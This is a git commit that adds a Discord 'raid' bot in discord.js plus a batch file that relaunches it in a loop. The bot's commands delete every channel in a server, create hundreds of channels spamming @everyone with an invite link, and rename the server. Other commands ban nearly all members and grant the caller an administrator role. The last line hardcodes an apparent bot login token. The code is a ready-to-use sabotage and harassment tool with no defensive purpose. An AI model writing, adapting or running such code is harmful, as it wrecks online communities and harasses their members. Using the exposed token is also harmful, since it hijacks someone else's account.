ac04bc3ccda8c963d1d1447298d3ad25086b5c24
zOncee <82526366+z11Oncee@users.noreply.github.com>
2021-06-16 15:56:05 +0200

    Add files via upload

---
+++ bat.bat
@@ -0,0 +1,7 @@
+@echo off
+title Bot Raid Developed By Demons
+:top
+cls
+node index.js
+pause
+goto top
---
+++ index.js
@@ -0,0 +1,252 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const chalk = require('chalk');
+
+client.on("ready", () => {
+  
+
+
+  
+  console.log(chalk.red("One moment..."));
+  console.log("   ")  
+  console.log(chalk.red(`Cliente ${client.user.tag} ready bitches!`));  
+  console.log(chalk.red("Developed by zOncee"));  
+  console.log("      ");
+  console.log(chalk.red("GALAXY CLUB!"));  
+  console.log("      ");
+  
+  
+  
+  console.log(chalk.red(`
+Comandos:
+
+  .gc
+  (nukea y raidea el server)
+
+  .banall
+  (banea a casi todos los usuarios)
+  
+  
+  
+  .perms
+  (crea un rol con admin y te lo da)
+
+  .stats
+  (te da las estadisticas del raid)`))
+
+console.log("      ")
+
+  
+   presencia();  
+    });
+
+
+
+function presencia(){
+  client.user.setPresence({
+status: "dnd",
+activity: {
+  name: "Galaxy Club",
+  type: "STREAMING"
+
+}
+  });
+}
+
+
+
+client.on("message", message => {
+  if(message.author.bot) return;
+
+  if(message.content === '.gc'){
+      message.delete()
+      message.guild.channels.cache.forEach(channel => channel.delete());
+      message.guild.channels.create(`GalaxyOnTop`, {
+        type: 'text'
+      }).then(channel => {
+        channel.send("https://cdn.discordapp.com/attachments/844240522789126184/844575155379634216/MOSHED-2021-4-15-15-15-38.gif")
+      })
+    for (let i = 0; i <= 500; i++) {
+         message.guild.channels.create(`Pwned-By-Galaxy`, {
+           type: 'text'
+         }).then(channel => {
+        
+       channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+       channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+       channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+       channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+channel.send("@everyone  PwnedByGalaxyClub https://discord.gg/uZxt69VXjH")
+
+
+      
+
+       
+
+      
+      
+       
+      
+           
+       })
+       }
+       message.guild.setName("RaidedByGalaxyClub");
+       message.guild.setIcon("https://cdn.discordapp.com/icons/831346422334881792/a_c0d08237fc288a8a8842f99163c70f3e.png");
+     }
+})
+
+//banall
+
+client.on("message", async message => {
+  if(message.content.startsWith('.banall')){
+    message.delete();
+    if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
+    message.guild.members.cache.forEach(member => {
+      if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
+        member.ban();
+      }
+    })
+  }});
+
+
+//admin
+
+client.on("message", async msg => {
+  if (msg.author.bot) return;
+  if(msg.content.toLowerCase().startsWith('.perms')){
+    let rol = await msg.guild.roles.create({data: {
+      name: "GalaxyClub",
+      color: "B9BBBE",
+      permissions: "ADMINISTRATOR",
+      hoisted: false
+    }})
+
+msg.member.roles.add(rol)
+      .then(function(role) {
+        msg.member.addRole(role);
+        if (msg.deletable) msg.delete().catch(e => {});
+      })
+      .catch(e => {});
+  }
+});
+
+
+// Lista de el raid
+
+
+client.on("message", message => {
+    if (message.author.bot) return;
+    const args = message.content.slice().trim().split(/ +/g );
+    const command = args.shift().toLowerCase();
+   if (command === '.stats') {
+       message.delete()
+       const embed = new Discord.MessageEmbed()
+       .setTitle(message.guild.name)
+       .setThumbnail()
+       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
+       .setColor("BLACK");
+       message.channel.send(embed)
+   }
+});
+
+
+client.login("ODUwMzc0NTE5NzMwNDcwOTQz.YLoy_A.J57MHM9i99kgn4JFg8ChZITth28");
